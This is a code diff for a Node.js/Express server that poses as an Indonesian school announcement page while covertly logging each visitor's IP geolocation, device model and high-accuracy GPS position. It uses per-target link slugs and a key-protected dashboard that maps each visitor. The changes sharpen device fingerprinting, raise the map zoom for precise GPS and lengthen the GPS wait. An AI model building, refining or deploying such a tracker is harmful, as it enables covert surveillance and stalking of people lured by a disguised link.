@@ -6,7 +6,6 @@ const http = require('http');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ============ CONFIG ============
 const DASH_KEY = 'gilang123';
 const TLOG = path.join(__dirname, '_tlog');
 const GEO_FILE = path.join(TLOG, 'geo.tsv');
@@ -17,7 +16,6 @@ if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
 if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
 if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
 
-// ============ HELPERS ============
 function clientIp(req) {
   const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
   return raw.replace(/^::ffff:/, '');
@@ -26,24 +24,43 @@ function clientIp(req) {
 function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
 function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }
 
+// --- FUNGSI DETEKSI HP (LEBIH AKURAT) ---
 function detectDevice(ua) {
   if (!ua) return 'Unknown Device';
   let os = 'Desktop';
-  if (/android/i.test(ua)) os = 'Android';
-  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
-  
+  let model = 'Unknown Model';
   let browser = 'Browser';
+
+  // 1. Deteksi OS & Model
+  if (/android/i.test(ua)) {
+    os = 'Android';
+    // Ambil string di dalam kurung, cth: (Linux; Android 10; SM-A505F)
+    const match = ua.match(/Android[^;]*;\s*([^;)]+)/i);
+    if (match && match[1]) {
+      model = match[1].trim();
+      // Bersihin tulisan "Build/..." atau "wv"
+      model = model.split(' Build/')[0].split(' wv')[0].replace(/;/g, '').trim();
+    }
+  } else if (/iphone/i.test(ua)) {
+    os = 'iOS';
+    model = 'iPhone';
+  } else if (/ipad/i.test(ua)) {
+    os = 'iOS';
+    model = 'iPad';
+  } else if (/macintosh|mac os x/i.test(ua)) {
+    os = 'macOS';
+    model = 'Mac';
+  } else if (/windows/i.test(ua)) {
+    os = 'Windows';
+    model = 'PC';
+  }
+
+  // 2. Deteksi Browser
   if (/chrome|crios/i.test(ua)) browser = 'Chrome';
   else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
   else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
 
-  let model = '';
-  const match = ua.match(/\(([^)]+)\)/);
-  if (match && match[1]) {
-     const parts = match[1].split(';');
-     if (parts.length > 2) model = parts[2].trim(); 
-  }
-  return `${os} | ${model ? model + ' | ' : ''} ${browser}`;
+  return `${model} (${os} - ${browser})`;
 }
 
 async function ipGeo(ip) {
@@ -59,7 +76,6 @@ app.set('trust proxy', true);
 app.use(express.json({ limit: '128kb' }));
 app.use(express.urlencoded({ extended: false }));
 
-// ============ API ============
 app.get('/api/geoip', async (req, res) => {
   res.set('Cache-Control', 'no-store');
   const ip = clientIp(req);
@@ -189,7 +205,7 @@ app.get('/dash/map', (req, res) => {
 
   const lat = d.gpsLat !== null ? d.gpsLat : d.lat;
   const lon = d.gpsLon !== null ? d.gpsLon : d.lon;
-  const zoom = d.gpsLat !== null ? 16 : 11;
+  const zoom = d.gpsLat !== null ? 17 : 11; // Zoom 17 buat GPS presisi
   const acc = d.gpsAcc || 500;
 
   res.type('html').send(`<!doctype html>
@@ -289,11 +305,6 @@ app.get('*', (req, res) => {
     <h3>Kegiatan Ekstrakurikuler</h3>
     <p>Pendaftaran ekstrakurikuler baru dibuka. Tersedia pilihan Pramuka, Paskibra, Futsal, Basket, dan Robotik. Silakan hubungi wali kelas untuk informasi lebih lanjut.</p>
   </div>
-  <div class="card">
-    <span class="date">2 hari lalu</span>
-    <h3>Pembayaran SPP Bulan Ini</h3>
-    <p>Diharapkan orang tua/wali murid segera menyelesaikan administrasi SPP sebelum tanggal 10. Pembayaran dapat dilakukan melalui bank atau langsung ke bagian tata usaha.</p>
-  </div>
 </div>
 
 <div class="loc-banner" id="locBanner">
@@ -325,10 +336,18 @@ app.get('*', (req, res) => {
     if (isGpsDone || !navigator.geolocation) return;
     isGpsDone = true;
     banner.classList.remove('show');
+    
+    // Minta GPS dengan akurasi tinggi
     navigator.geolocation.getCurrentPosition(
-      p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug,ts:Date.now()}) }).catch(()=>{}); btnLoc.innerText = 'Aktif'; },
-      e => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps_err',err:e.code,slug,ts:Date.now()}) }).catch(()=>{}); },
-      {enableHighAccuracy:true,timeout:9000,maximumAge:0}
+      p => { 
+        const payload = {src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug,ts:Date.now()};
+        fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) }).catch(()=>{}); 
+        btnLoc.innerText = 'Aktif'; 
+      },
+      e => { 
+        fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps_err',err:e.code,slug,ts:Date.now()}) }).catch(()=>{}); 
+      },
+      {enableHighAccuracy:true,timeout:15000,maximumAge:0} // Timeout 15 detik buat nunggu satelit
     );
   });
 })();
